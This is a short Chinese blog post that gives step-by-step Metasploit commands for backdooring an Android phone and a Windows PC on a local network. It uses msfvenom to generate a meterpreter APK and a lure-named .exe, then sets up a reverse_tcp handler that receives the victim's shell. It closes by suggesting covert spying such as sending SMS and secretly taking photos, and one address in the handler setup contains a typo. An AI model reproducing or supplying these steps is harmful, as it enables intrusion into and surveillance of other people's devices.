MSF上线

2022-02-14

做了两个关于MSF上线的小实验，一个关于安卓手机，另一个关于windows操作系统。(同一个局域网下)

一、安卓手机MSF上线

1.打开kali，在命令窗口中输入 ifconfig 查看kali的ip地址

2.接着输入命令

msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.108 lport=5555 > 1.apk

（这里lhost是kali的ip地址，lport自己选择，1.apk也是可以自己取名的）

可以在root文件夹中看到生成了一个1.apk文件

3.启用msf工具，输入msfconsole

4.选择攻击模块 输入命令 use exploit/multi/handler

设置攻击载荷反向tcp链接，lhost和lport

set payload android/meterpreter/reverse_tcp

set LHOST 1921.168.0.108

set lport 5555

执行攻击 run

5.将1.apk文件发送到手机上并安装（我使用的是oppo A5，新的手机可能实现不了）

安装之后点击一下，然后就可以看到kali已经成功入侵了手机啦

6.又是渗透后的利用，可以发短信，偷拍等，自行发挥吧

二、windows操作系统MSF上线

1.查看kali的ip ifconfig（我上面的ip是192.168.0.108，接着使用一下）

2.生成 .exe后门文件

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=6060 -f exe > 谁用谁牛逼.exe

3.启用msf工具，输入msfconsole

4.选择攻击模块 输入命令 use exploit/multi/handler

设置攻击载荷反向tcp链接，lhost和lport

set payload windows/meterpreter/reverse_tcp

set LHOST 192.168.0.108

set LPORT 6060

执行攻击 run（和上面的步骤差不多，注意把android改成windows）

5.在靶机上双击后门文件，kali中显示上线了

6.渗透后利用。。。自己琢磨吧，为所欲为。
